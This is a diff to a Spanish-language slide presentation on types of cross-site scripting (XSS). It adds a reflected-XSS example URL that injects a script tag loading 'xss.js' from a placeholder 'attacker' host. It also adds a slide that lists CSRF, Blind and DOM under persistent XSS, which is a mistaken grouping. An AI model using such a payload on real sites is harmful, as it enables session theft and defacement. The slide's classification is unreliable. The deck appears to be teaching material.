@@ -54,9 +54,26 @@
 
 				<section>
 					<h1>Tipos de XSS</h1>
-					<p class="fragment fade-up"></p>
-					<p class="fragment fade-up">grow</p>
-					<p class="fragment fade-up">grow</p>
+					<p class="fragment fade-up">XSS Reflected (No persistente)</p>
+					<p class="fragment fade-up">XSS Stored (Persistente)</p>
+					<section>
+						<h2>XSS No persistente</h2>
+						<pre>
+							<code class="hljs" data-trim contenteditable>
+								http://example/?var=<SCRIPT%20a=”>”%20SRC=”http://attacker/xss.js”>&lt;/SCRIPT>
+							</code>
+						</pre>
+					</section>
+					<section>
+						<h2>XSS persistente</h2>
+						<p>
+							<lu>
+								<li>CSRF</li>
+								<li>Blind</li>
+								<li>DOM</li>
+							</lu>
+						</p>
+					</section>
 				</section>
 
 				<section data-background-image="images/slider-red.jpg" data-background-transition="zoom">
